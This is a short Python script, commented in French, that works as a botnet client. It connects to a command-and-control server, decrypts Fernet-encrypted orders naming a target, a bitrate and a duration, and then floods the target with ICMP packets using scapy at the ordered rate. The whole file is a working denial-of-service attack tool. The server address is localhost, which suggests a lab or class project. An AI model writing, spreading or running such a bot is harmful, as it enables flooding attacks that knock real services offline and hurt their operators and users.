from random import randint
from cryptography.fernet import Fernet
import socket
from scapy.all import *
import time
import threading

#Récupération de la clé symétrique
with open("secret.key", "rb") as key_file:
    key=key_file.read()
fernet = Fernet(key)

#Création d'un socket
client_socket = socket.socket()

#Essai de connection au serveur controlant le bot
host = "127.0.0.1"
port = 8081
print('Waiting for connection response')
try:
    client_socket.connect((host, port))
except socket.error as e:
    print(str(e))

#Réception des consignes
res = client_socket.recv(1024)
decrypted_data=fernet.decrypt(res).decode('utf-8')


#Calcul des paramètres de l'attaque
bitrate = float(decrypted_data.split(" ")[1])
packet_size = 1450
wait_time = packet_size/(bitrate*(2**(20)))
time_length = int(decrypted_data.split(" ")[2])
target = decrypted_data.split(" ")[0]

print("Parameters acquiered, attack starting...")

#Création du paquet ICMP
packet = IP(dst=target)/ICMP()/Raw(RandString(packet_size))


start_time = time.time()

#Attaque
while time.time()-start_time < time_length: 
    send(packet, verbose=False)
    time.sleep(wait_time)
    
client_socket.send(fernet.encrypt(bytes("", 'utf-8')))
client_socket.close()